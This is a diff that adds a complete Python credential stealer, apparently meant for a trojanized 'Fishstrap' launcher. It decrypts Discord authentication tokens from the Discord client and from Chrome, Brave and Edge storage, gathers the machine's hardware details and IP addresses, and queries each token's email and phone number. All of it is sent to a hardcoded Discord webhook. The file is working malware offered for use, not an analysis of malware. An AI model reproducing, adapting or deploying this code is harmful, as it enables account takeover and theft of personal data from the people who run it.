@@ -1,0 +1,325 @@
+import sys
+import os
+import shutil
+import subprocess
+import json
+import requests
+import time
+import base64
+import win32crypt
+import platform
+import socket
+from Crypto.Cipher import AES
+
+def get_master_key():
+    appdata = os.getenv("APPDATA")
+    if not appdata:
+        return None
+        
+    local_state_path = os.path.join(appdata, "discord", "Local State")
+    if not os.path.exists(local_state_path):
+        local_appdata = os.getenv("LOCALAPPDATA")
+        if local_appdata:
+            local_state_path = os.path.join(local_appdata, "Discord", "Local State")
+            
+    if not os.path.exists(local_state_path):
+        return None
+
+    try:
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        encrypted_key = encrypted_key[5:] 
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except Exception:
+        return None
+
+def decrypt_val(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)[:-16].decode("utf-8", errors="ignore")
+        return decrypted_pass
+    except Exception:
+        return None
+
+def obtener_tokens_reales():
+    master_key = get_master_key()
+    if not master_key:
+        return []
+
+    tokens = []
+    leveldb_path = os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb")
+    
+    if not os.path.exists(leveldb_path):
+        return []
+
+    for file in os.listdir(leveldb_path):
+        if file.endswith(".ldb") or file.endswith(".log"):
+            file_path = os.path.join(leveldb_path, file)
+            try:
+                with open(file_path, "rb") as f:
+                    content = f.read()
+                
+                pos = 0
+                while True:
+                    pos = content.find(b"dQw4w9WgXcQ:", pos)
+                    if pos == -1:
+                        break
+                    
+                    try:
+                        end_pos = content.find(b'"', pos)
+                        if end_pos == -1:
+                            end_pos = pos + 150
+                        
+                        encrypted_block = content[pos:end_pos]
+                        if b":" in encrypted_block:
+                            raw_data = base64.b64decode(encrypted_block.split(b":")[1])
+                            token = decrypt_val(raw_data, master_key)
+                            if token and token not in tokens:
+                                tokens.append(token)
+                    except Exception:
+                        pass
+                    
+                    pos += len(b"dQw4w9WgXcQ:")
+            except Exception:
+                continue
+                
+    return tokens
+
+def get_master_key_for_path(local_state_path):
+    if not os.path.exists(local_state_path):
+        return None
+    try:
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = json.load(f)
+        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+        encrypted_key = encrypted_key[5:] 
+        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+    except Exception:
+        return None
+
+def decrypt_val(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)[:-16].decode("utf-8", errors="ignore")
+        return decrypted_pass
+    except Exception:
+        return None
+
+def obtener_tokens_multiples_rutas():
+    appdata = os.getenv("APPDATA")
+    local_appdata = os.getenv("LOCALAPPDATA")
+    
+    if not appdata or not local_appdata:
+        return []
+
+    # 1. Definir las rutas de las apps de escritorio y navegadores comunes
+    rutas_discord = {
+        "Discord Stable": {
+            "leveldb": os.path.join(appdata, "discord", "Local Storage", "leveldb"),
+            "local_state": os.path.join(appdata, "discord", "Local State")
+        },
+        "Discord PTB": {
+            "leveldb": os.path.join(appdata, "discordptb", "Local Storage", "leveldb"),
+            "local_state": os.path.join(appdata, "discordptb", "Local State")
+        },
+        "Discord Canary": {
+            "leveldb": os.path.join(appdata, "discordcanary", "Local Storage", "leveldb"),
+            "local_state": os.path.join(appdata, "discordcanary", "Local State")
+        },
+        "Google Chrome": {
+            "leveldb": os.path.join(local_appdata, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
+            "local_state": os.path.join(local_appdata, "Google", "Chrome", "User Data", "Local State")
+        },
+        "Brave": {
+            "leveldb": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
+            "local_state": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data", "Local State")
+        },
+        "Microsoft Edge": {
+            "leveldb": os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
+            "local_state": os.path.join(local_appdata, "Microsoft", "Edge", "User Data", "Local State")
+        }
+    }
+
+    tokens = []
+
+    # 2. Iterar sobre cada plataforma configurada
+    for plataforma, paths in rutas_discord.items():
+        leveldb_path = paths["leveldb"]
+        local_state_path = paths["local_state"]
+
+        if not os.path.exists(leveldb_path):
+            continue
+
+        master_key = get_master_key_for_path(local_state_path)
+        if not master_key:
+            continue
+
+        # 3. Buscar tokens en los archivos de LevelDB de esta ruta
+        for file in os.listdir(leveldb_path):
+            if file.endswith(".ldb") or file.endswith(".log"):
+                file_path = os.path.join(leveldb_path, file)
+                try:
+                    with open(file_path, "rb") as f:
+                        content = f.read()
+                    
+                    pos = 0
+                    while True:
+                        pos = content.find(b"dQw4w9WgXcQ:", pos)
+                        if pos == -1:
+                            break
+                        
+                        try:
+                            end_pos = content.find(b'"', pos)
+                            if end_pos == -1:
+                                end_pos = pos + 150
+                            
+                            encrypted_block = content[pos:end_pos]
+                            if b":" in encrypted_block:
+                                raw_data = base64.b64decode(encrypted_block.split(b":")[1])
+                                token = decrypt_val(raw_data, master_key)
+                                if token and token not in tokens:
+                                    tokens.append(token)
+                        except Exception:
+                            pass
+                        
+                        pos += len(b"dQw4w9WgXcQ:")
+                except Exception:
+                    continue
+                    
+    return tokens
+
+########Webhook###############################################################
+
+WEBHOOK_URL_UNICO = "https://discord.com/api/webhooks/1557079500712575016/UgqNpfxAwc0j3moHXUZs6g5ljdLmwPfwQGjnQWAAr2WemT8v3XL_mhJNE-2kzWbCo2OA"
+
+def obtener_info_pc():
+    info_sistema = {}
+
+    try:
+        cmd_cpu = "wmic cpu get name"
+        procesador = (
+            subprocess.check_output(cmd_cpu, shell=True)
+            .decode("utf-8", errors="ignore")
+            .split("\n")[1]
+            .strip()
+        )
+        info_sistema["procesador"] = procesador if procesador else "Desconocido"
+    except Exception:
+        info_sistema["procesador"] = platform.processor() or "Desconocido"
+
+    info_sistema["os"] = f"{platform.system()} {platform.release()} ({platform.version()})"
+    info_sistema["nombre_pc"] = socket.gethostname()
+
+    try:
+        info_sistema["ip_local"] = socket.gethostbyname(info_sistema["nombre_pc"])
+    except Exception:
+        info_sistema["ip_local"] = "No disponible"
+
+    try:
+        response = requests.get("https://api.ipify.org?format=json", timeout=5)
+        info_sistema["ip_publica"] = response.json().get("ip", "No disponible")
+    except Exception:
+        info_sistema["ip_publica"] = "No disponible"
+
+    try:
+        cmd_gpu = "wmic path win32_videocontroller get name"
+        gpu = (
+            subprocess.check_output(cmd_gpu, shell=True)
+            .decode("utf-8", errors="ignore")
+            .split("\n")[1]
+            .strip()
+        )
+        info_sistema["gpu"] = gpu if gpu else "Desconocida"
+    except Exception:
+        info_sistema["gpu"] = "No disponible"
+
+    return info_sistema
+
+def obtener_datos_usuario(token):
+    headers = {
+        "Authorization": token.strip(),
+        "Content-Type": "application/json"
+    }
+    try:
+        response = requests.get("https://discord.com/api/v10/users/@me", headers=headers)
+        if response.status_code == 200:
+            return {"success": True, "data": response.json()}
+        else:
+            return {"success": False, "status": response.status_code}
+    except Exception as e:
+        return {"success": False, "status": str(e)}
+
+def enviar_reporte_completo(tokens):
+    datos_pc = obtener_info_pc()
+    
+    descripcion = (
+        f" **PC:** `{datos_pc['nombre_pc']}`\n"
+        f"️ **OS:** `{datos_pc['os']}`\n"
+        f"️ **Procesador:** `{datos_pc['procesador']}`\n"
+        f" **Gráfica (GPU):** `{datos_pc['gpu']}`\n"
+        f" **IP Local:** `{datos_pc['ip_local']}`\n"
+        f" **IP Pública:** `{datos_pc['ip_publica']}`\n\n"
+        f"--- \n"
+        f" **Tokens :**\n"
+    )
+
+    if tokens:
+        for token in tokens:
+            token_limpio = token.strip()
+            resultado = obtener_datos_usuario(token_limpio)
+            
+            if resultado["success"]:
+                user_data = resultado["data"]
+                username = user_data.get("username", "Desconocido")
+                user_id = user_data.get("id", "Desconocido")
+                email = user_data.get("email", "No disponible")
+                phone = user_data.get("phone", "No disponible")
+                
+                descripcion += (
+                    f"\n **User:** `{username}` (ID: `{user_id}`)\n"
+                    f"• **Email:** `{email}` | **Tel:** `{phone}`\n"
+                    f"• **Token:**\n`{token_limpio}`\n"
+                )
+            else:
+                status = resultado["status"]
+                descripcion += (
+                    f"\n❌ **Token Inválido (Error: {status}):**\n"
+                    f"`{token_limpio}`\n"
+                )
+            
+            time.sleep(0.5)
+    else:
+        descripcion += "_No se encontraron tokens._"
+
+    payload = {
+        "embeds": [
+            {
+                "title": "Fishstrap Infectado V1",
+                "description": descripcion,
+                "color": 5814783,
+                "footer": {
+                    "text": "Por BossaNovita"
+                }
+            }
+        ]
+    }
+
+    try:
+        response = requests.post(WEBHOOK_URL_UNICO, json=payload)
+        if response.status_code in [200, 204]:
+            print("")
+        else:
+            print(f"Error al enviar el webhook. Código: {response.status_code}")
+    except Exception as e:
+        print(f"Error de conexión al enviar el webhook: {e}")
+
+if __name__ == "__main__":
+    tokens = obtener_tokens_reales() 
+    
+    if tokens:
+        enviar_reporte_completo(tokens)
